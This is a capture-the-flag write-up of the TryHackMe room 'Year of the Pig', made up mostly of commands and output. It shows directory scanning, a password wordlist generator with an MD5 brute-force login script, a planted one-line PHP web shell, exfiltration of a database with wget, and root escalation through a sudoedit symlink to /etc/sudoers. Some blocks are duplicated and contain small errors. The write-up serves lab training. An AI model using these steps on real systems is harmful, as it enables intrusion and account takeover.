<img width="100" alt="image" src="https://github.com/user-attachments/assets/57c73139-ba51-4145-bd15-f8793c6e1886" />

https://tryhackme.com/room/yearofthepig

Some pigs do fly...

<img width="1890" height="397" alt="image" src="https://github.com/user-attachments/assets/5ac5a419-0ad5-456b-8fe2-85ef3f1b6616" />



```bash
nmap -sC -sV -Pn -p- -T5 TargetIP
...
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Marco's Blog
```

<p>

- /admin/<br>
- /api/<br>
- /assets/<br>
- /css/<br>
- index.html<br>
- /js/<br>
- login.php</p>

```bash
gobuster dir -u http://pig.thm/ -w /usr/share/wordlists/dirb/big.txt -e -k -q -x txt,php,html -t 60
...
http://pig.thm/admin                (Status: 301) [Size: 302] [--> http://pig.thm/admin/]
http://pig.thm/api                  (Status: 301) [Size: 300] [--> http://pig.thm/api/]
http://pig.thm/assets               (Status: 301) [Size: 303] [--> http://pig.thm/assets/]
http://pig.thm/css                  (Status: 301) [Size: 300] [--> http://pig.thm/css/]
http://pig.thm/index.html           (Status: 200) [Size: 4801]
http://pig.thm/js                   (Status: 301) [Size: 299] [--> http://pig.thm/js/]
http://pig.thm/login.php            (Status: 200) [Size: 2790]
...
```

```bash
gobuster dir -u http://pig.thm/admin/ -w /usr/share/wordlists/dirb/big.txt -e -k -q -x txt,php,html -t 60
...
http://pig.thm/admin/index.php            (Status: 302) [Size: 3158] [--> /login.php]
http://pig.thm/admin/includes.php         (Status: 200) [Size: 272]
http://pig.thm/admin/landing.php          (Status: 302) [Size: 445] [--> /login.php]
http://pig.thm/admin/resetpassword.php    (Status: 302) [Size: 2008] [--> /login.php]](http://pig.thm/admin/index.php            (Status: 302) [Size: 3158] [--> /login.php]
http://pig.thm/admin/includes.php         (Status: 200) [Size: 272]
http://pig.thm/admin/landing.php          (Status: 302) [Size: 445] [--> /login.php]
http://pig.thm/admin/resetpassword.php    (Status: 302) [Size: 2008] 
```

```bash
gobuster dir -u http://pig.thm/api/ -w /usr/share/wordlists/dirb/big.txt -e -k -q -x txt,php,html -t 60
Error: the server returns a status code that matches the provided options for non existing urls. http://pig.thm/api/433a855f-11f9-4ddd-8021-08ee7d4d9f08 => 200 (Length: 68). To continue please exclude the status code or the length
```

```bash
gobuster dir -u http://pig.thm/assets/ -w /usr/share/wordlists/dirb/big.txt -e -k -q -x txt,php,html -t 60
...
http://pig.thm/assets/fonts                (Status: 301) [Size: 309] [--> http://pig.thm/assets/fonts/]
http://pig.thm/assets/img                  (Status: 301) [Size: 307] [-
```

```bash
gobuster dir -u http://pig.thm/assets/ -w /usr/share/wordlists/dirb/big.txt -e -k -q -x txt,php,html -t 60
...
http://pig.thm/assets/fonts                (Status: 301) [Size: 309] [--> http://pig.thm/assets/fonts/]
http://pig.thm/assets/img                  (Status: 301) [Size: 307] [-
```

<img width="1056" height="478" alt="image" src="https://github.com/user-attachments/assets/cbadbbb2-ce80-4338-8640-6f624fc120ee" />

<br>
<br>
<br>

<h3>/index.html</h3>

<img width="1048" height="390" alt="image" src="https://github.com/user-attachments/assets/b3b625b7-3594-4b9d-8597-3d9e3a2d2404" />


<br>
<br>
<br>

<img width="1032" height="311" alt="image" src="https://github.com/user-attachments/assets/58b23987-f73c-48e4-9330-daf4990971f7" />

<br>
<br>

<img width="1053" height="372" alt="image" src="https://github.com/user-attachments/assets/85461185-8c85-4684-affa-d0295b481b25" />


```bash
Remember that passwords should be a memorable word, followed by two numbers and a special character
```

```bash
memorableWords = ['Italy', 'italy', 'Milan', 'milan', 'Savoia', 'savoia',
                  'Curtiss', 'curtiss', 'Curtis', 'curtis', 'planes', 'Planes',
                  'Plane', 'plane']
specialChars = ['!','@','#','$']
count = 0

for word in memorableWords:
    for specialChar in specialChars:
        while (count <= 99):
            if (count <= 9):
                count = '0' + str(count)
            else:
                count = str(count)
            print(word + count + specialChar)
            count = int(count)
            count += 1
        count = 0
```

```bash
python3 words.py > wordsl.txt
```

```bash
tail -n 6 wordsl.txt
plane94$
plane95$
plane96$
plane97$
plane98$
plane99$
```

```bash
while read -r line; do printf %s "$line" | md5sum | cut -f1 -d' '; done < wordsl.txt | tee -a wordsh.txt ls > este
```

```bash
tail -n 3 este
b6ebbbe33a4580cca6c870c770fa36c4
6375c114ae25223dd775f057d5a130ec
89d6fc4ce85359185258f8b6aecd9a92
```



```bash
POST /api/login HTTP/1.1
Host: pig.thm
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://pig.thm/login.php
Content-Type: text/plain;charset=UTF-8
Content-Length: 65
Origin: http://pig.thm
Connection: keep-alive
Priority: u=0

{"username":"marco","password":"§5f4dcc3b5aa765d61d8327deb882cf99§"}
```

```bash
www-data@year-of-the-pig:/tmp$ sqlite3 /var/www/admin.db
```

```bash
www-data@year-of-the-pig:/tmp$ sqlite3 /var/www/admin.db
```

```bash
sqlite> .tables
sessions   users
...
sqlite> select * from user;
.....marco...
.....curtis...
```

```bash
#!/usr/bin/python
import requests
import hashlib

user = 'marco'
url = 'http://xx.xxx.xx.xx/api/login'
headers = {'Accept': 'application/json'}
f = open('password','r')
for line in f.readlines():
        line = line.strip()
        result = hashlib.md5(line.encode()).digest().hex()
        print("Trying : " + result,end='\r',flush=True)
        data = { 'username':user,
                 'password':result}

        r = requests.post(url=url,json=data,headers=headers,proxies={'http':'127.0.0.1:8080'})
        if 'Incorrect Username or Password' not in r.text:
                print("\nPassword Found for "+user + ':'  + line)
                exit(0)

print('Finished')
```


```bash
python3 s.py
Finished ...
```



<img width="1050" height="440" alt="image" src="https://github.com/user-attachments/assets/52cfaf63-ed86-4ecd-8a26-a05ac3892131" />



<img width="1060" height="455" alt="image" src="https://github.com/user-attachments/assets/a520a537-ddf1-4e97-a67d-d631e71c552d" />


<img width="1057" height="354" alt="image" src="https://github.com/user-attachments/assets/e6692949-1565-4132-b26a-2bcae7c03e60" />


```bash
:~# ssh marco@pig.thm
...
marco@pig.thm's password: 

	
	__   __                       __   _   _            ____  _       
	\ \ / /__  __ _ _ __    ___  / _| | |_| |__   ___  |  _ \(_) __ _ 
	 \ V / _ \/ _` | '__|  / _ \| |_  | __| '_ \ / _ \ | |_) | |/ _` |
	  | |  __/ (_| | |    | (_) |  _| | |_| | | |  __/ |  __/| | (_| |
	  |_|\___|\__,_|_|     \___/|_|    \__|_| |_|\___| |_|   |_|\__, |
	                                                            |___/ 


marco@year-of-the-pig:~$ id
uid=1000(marco) gid=1000(marco) groups=1000(marco),1002(web-developers)
marco@year-of-the-pig:~$ pwd
/home/marco
marco@year-of-the-pig:~$ ls
flag1.txt
```

```bash
marco@year-of-the-pig:~$ cat flag1.txt
THM{*******************************}
```


```bash
marco@year-of-the-pig:/var/www$ ls -lah
total 36K
drwxr-xr-x  3 www-data web-developers 4.0K Sep 17 02:44 .
drwxr-xr-x 13 root     root           4.0K Aug 22  2020 ..
-rw-------  1 www-data www-data        24K Sep 17 02:44 admin.db
drwxrwxr-x  7 www-data web-developers 4.0K Aug 21  2020 html
```

```bash
marco@year-of-the-pig:/var/www/html/admin$ ls -lah
total 56K
drwxrwxr-x 2 www-data web-developers 4.0K Aug 21  2020 .
drwxrwxr-x 7 www-data web-developers 4.0K Aug 21  2020 ..
-rwxrwxr-x 1 www-data web-developers 2.0K Aug 21  2020 adduser.php
-rwxrwxr-x 1 www-data web-developers 1.7K Aug 21  2020 commands.php
-rwxrwxr-x 1 www-data web-developers 1.8K Aug 21  2020 deleteuser.php
-rwxrwxr-x 1 root     root            338 Aug 21  2020 getCurrentUser.php
-rwxrwxr-x 1 www-data web-developers  270 Aug 21  2020 getUsers.php
-rwxrwxr-x 1 www-data web-developers  393 Aug 21  2020 includes.php
-rwxrwxr-x 1 www-data web-developers 3.3K Aug 21  2020 index.php
-rwxrwxr-x 1 www-data web-developers  390 Aug 21  2020 landing.php
-rwxrwxr-x 1 root     root            143 Aug 21  2020 prepareAuth.php
-rwxrwxr-x 1 www-data web-developers 1.8K Aug 21  2020 resetpassword.php
-rwxrwxr-x 1 root     root            268 Aug 21  2020 sessionCleanup.php
-rwxrwxr-x 1 www-data web-developers  782 Aug 21  2020 style.css
```

```bash
marco@year-of-the-pig:/var/www/html/admin$ cat commands.php
<?php
    require_once "/var/www/html/admin/prepareAuth.php";
    if (!$auth){
        header("location: /login.php");
    }
	$dbh->close();
?>

<!DOCTYPE html>
<html>
	<p id="id" style="display:none">commands</p>
	<?php require "includes.php";?>
	<body class="include">
		<h1 id="content-title">Commands</h1>
		<h2>Use this page to execute arbitrary commands on the system</h2>
		<form method=post style="display: inline;">
			<input type=text name="command" class="input" placeholder="Command...">
			<input style="display:none;" type=submit name="submit" value="Execute" class="input" id="submit">
		</form>
		<img alt="submit" src="/assets/img/arrow.png" class="submit-btn" onclick="javascript:document.querySelector('#submit').click()">
		<?php
			//Totally useless script to catch hackers out, eh, Marco? You old rogue!
			if (isset($_POST["command"])){
				echo "<pre>";
				$cmd=$_POST["command"];
				if (strlen($cmd) == 0){
					echo "No command entered";
				}
				else if ($cmd == "whoami"){
					echo "www-data";
				}
				else if ($cmd == "id"){
					echo "uid=33(www-data) gid=33(www-data) groups=33(www-data)";
				}
				else if ($cmd == "ifconfig"){
					system("ifconfig");
				}
				else if (substr($cmd,0,5) == "echo "){
					echo substr($cmd,5);
				}
				else if ($cmd == "hostname"){
					echo "year-of-the-pig";
				}
				else if (stristr($cmd,"nc")){
					preg_match("/\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3} +\d{1,5}/", $cmd, $string);
					$components = explode(" ", $string[0]);
					$ip = $components[0];
					$port = end(array_values($components));
					system("nc $ip $port >/dev/null 2>&1");
				}
				else{
					echo "Invalid Command!";
				}
				echo "<pre>\n";
			}
		?>
	</body>
</html>
``` 

```bash
$ wget http://xx.xxx.xx.xx:8000/admin.db -o admin.db
``` 

```bash
marco@year-of-the-pig:/var/www$ cat /etc/passwd | grep -i bash
root:x:0:0:root:/root:/bin/bash
marco:x:1000:1000::/home/marco:/bin/bash
curtis:x:1001:1001::/home/curtis:/bin/bash
```

```bash
marco@year-of-the-pig:/var/www$ ps -eo pid,user,command
  PID USER     COMMAND
...
  450 systemd+ /lib/systemd/systemd-networkd
  497 systemd+ /lib/systemd/systemd-timesyncd
  498 systemd+ /lib/systemd/systemd-resolved
  508 message+ /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
  509 root     /usr/lib/accountsservice/accounts-daemon
  510 root     /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
  511 syslog   /usr/sbin/rsyslogd -n
  512 root     /lib/systemd/systemd-logind
  514 root     /usr/sbin/cron -f
  515 daemon   /usr/sbin/atd -f
  516 root     /usr/bin/lxcfs /var/lib/lxcfs/
  559 root     /sbin/agetty -o -p -- \u --noclear tty1 linux
  578 root     /usr/lib/policykit-1/polkitd --no-debug
  583 root     /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
  584 root     /usr/sbin/sshd -D
  601 root     /usr/sbin/apache2 -k start
  646 root     /sbin/agetty -o -p -- \u --keep-baud 115200,38400,9600 ttyS0 vt220
 1176 root     [kworker/u30:1]
 1188 www-data /usr/sbin/apache2 -k start
 1252 www-data /usr/sbin/apache2 -k start
 1304 root     [kworker/0:0]
 1370 www-data /usr/sbin/apache2 -k start
...
```

```bash
marco@year-of-the-pig:/var/www/html/admin$ ls -lah commands.php
-rwxrwxr-x 1 www-data web-developers 1.7K Aug 21  2020 commands.php
```

```bash
marco@year-of-the-pig:/var/www/html/admin$ cp commands.php commands.bak
marco@year-of-the-pig:/var/www/html/admin$ nano commands.php
```

```bash
marco@year-of-the-pig:/var/www/html/admin$ cat commands.php
<?php
echo system($_REQUEST['cmd'];
?>
```

```bash
marco@year-of-the-pig:/var/www/html/admin$ curl localhost/admin/commands.php -d 'cmd=chmod 777 /var/www/admin.db'
marco@year-of-the-pig:/var/www/html/admin$ ls -la /var/www/admin.db
-rw------- 1 www-data www-data 24576 Sep 17 02:44 /var/www/admin.db
```



<img width="954" height="367" alt="image" src="https://github.com/user-attachments/assets/cb1381cb-3416-4029-ab2b-e1481ad4f5f7" />

<br>
<br>
<br>



<img width="934" height="233" alt="image" src="https://github.com/user-attachments/assets/5bef4268-f864-4012-b4cc-6b4a7410aa81" />

<br>
<br>
<br>


<img width="947" height="286" alt="image" src="https://github.com/user-attachments/assets/35820a65-b52d-4190-a672-f8a602249e62" />

<br>
<br>
<br>



<h3>/admin/resetpassword.php</h3>


<img width="1096" height="365" alt="image" src="https://github.com/user-attachments/assets/2e983075-3f19-49da-b79a-60e8c05014fc" />

<br>
<br>
<br>



<h3>/login.php & admin:admin</h3>

<img width="1094" height="227" alt="image" src="https://github.com/user-attachments/assets/1ca72c34-5803-42a5-8af8-61216b28b1ef" />

<br>
<br>
<br>


```bash
memorableWords = ['Italy', 'italy', 'Milan', 'milan', 'Savoia', 'savoia',
                  'Curtiss', 'curtiss', 'Curtis', 'curtis', 'planes', 'Planes',
                  'Plane', 'plane']
specialChars = ['!','@','#','$']
count = 0

for word in memorableWords:
    for specialChar in specialChars:
        while (count <= 99):
            if (count <= 9):
                count = '0' + str(count)
            else:
                count = str(count)
            print(word + count + specialChar)
            count = int(count)
            count += 1
        count = 0
```

```bash
python memorable.py > wordlist.txt
```

```bash
tail wordlist.txt
plane90$
plane91$
plane92$
plane93$
plane94$
plane95$
plane96$
plane97$
plane98$
plane99$
```

```bash
while read -r line; do printf %s "$line" | md5sum | cut -f1 -d' '; done < passwords_generated.lst | tee -a passwords_hashed.lst
```

```bash
tail hashed_passwords
9a6216dcf0a945a1f70fb7dd2aa10b36
41fb768d68788990c0b73e72733ed1aa
5b127e461341cabb165444342245bae6
60c0d7fd1069d09821161fb7fc51376d
342d5765ac9c87a39323d67e662fe9cd
cd9170ba05edab80fc067639ed64f320
d727a859382cfc4263c5d6ec9f8e6b7c
b6ebbbe33a4580cca6c870c770fa36c4
6375c114ae25223dd775f057d5a130ec
89d6fc4ce85359185258f8b6aecd9a92
```


<img width="1046" height="432" alt="image" src="https://github.com/user-attachments/assets/06b7e18f-21ea-4445-8ffd-e2935fb2b03b" />

<br>
<br>
<br>


<img width="1033" height="409" alt="image" src="https://github.com/user-attachments/assets/ab322a15-dde8-4990-86ca-b0e57652efd9" />

<br>
<br>
<br>


<img width="1333" height="530" alt="image" src="https://github.com/user-attachments/assets/2bfcd1ad-3fc5-4c64-9913-921caed6474a" />

<br>
<br>
<br>

```bash
marco@year-of-the-pig:/var/www/html/abc$ mkdir abc
```

```bash
marco@year-of-the-pig:/var/www/html/abc$ chmod 777 abc
```

```bash
marco@year-of-the-pig:/var/www/html/abc$ cd abc
```

```bash
marco@year-of-the-pig:/var/www/html/abc/abc$ ln -sf /etc/sudoers config.php
```

```bash
marco@year-of-the-pig:/var/www/html/abc/abc$ ls -lah
total 8.0K
drwxrwxrwx 2 marco marco 4.0K Oct 19 01:51 .
drwxrwxrwx 3 marco marco 4.0K Oct 19 01:50 ..
lrwxrwxrwx 1 marco marco   12 Oct 19 01:51 config.php -> /etc/sudoers
```

```bash
marco@year-of-the-pig:/var/www/html/abc/abc$ su curtis

Password:
```

```bash
curtis@year-of-the-pig:/var/www/html/abc/abc$ ls
config.php
```

```bash
curtis@year-of-the-pig:/var/www/html/abc/abc$ cd /home/curtis
```

```bash
curtis@year-of-the-pig:~$ ls
flag2.txt
```

```bash
curtis@year-of-the-pig:/var/www/html/abc/abc$ sudoedit /var/www/html/abc/abc/config.php
```

```bash
curtis@year-of-the-pig:/var/www/html/abc/abc$ sudo su
```

```bash
root@year-of-the-pig:/var/www/html/abc/abc# whoami
root
```

```bash
root@year-of-the-pig:/var/www/html/abc/abc# cd /root
```

```bash
root@year-of-the-pig:~# ls
root.txt
```

```bash
root@year-of-the-pig:~# cat root.txt
THM{*******************************}
```

<img width="1907" height="889" alt="image" src="https://github.com/user-attachments/assets/935d2476-4ad9-4f96-8f76-44c6f4b044d0" />

<br>
<br>
<br>


<img width="1909" height="894" alt="image" src="https://github.com/user-attachments/assets/1ab5b9aa-2fa8-4da5-8b30-a8f1be4cff44" />


<br>
<br>
<br>

<p>18<br>
530<br>
131,531<br>
89<br>
4<br>
72<br>
2<br></p>




<img width="329" height="88" alt="image" src="https://github.com/user-attachments/assets/4f2a6ac3-d817-428c-8eaf-315e58bfcaef" />


<img width="1903" height="889" alt="image" src="https://github.com/user-attachments/assets/9b4326cc-1c04-4637-bf31-366136e1f0fc" />


<br>
<br>

<img width="1885" height="895" alt="image" src="https://github.com/user-attachments/assets/3fdc4e3b-d95b-432a-b451-36d582f9dc54" />

<br>
<br>

<img width="1888" height="895" alt="image" src="https://github.com/user-attachments/assets/5d478b71-5d08-4674-802d-4c68485323fe" />

<br>
<br>


<img width="1891" height="891" alt="image" src="https://github.com/user-attachments/assets/148952c4-89da-4cb4-9ad7-395e9b5100bc" />

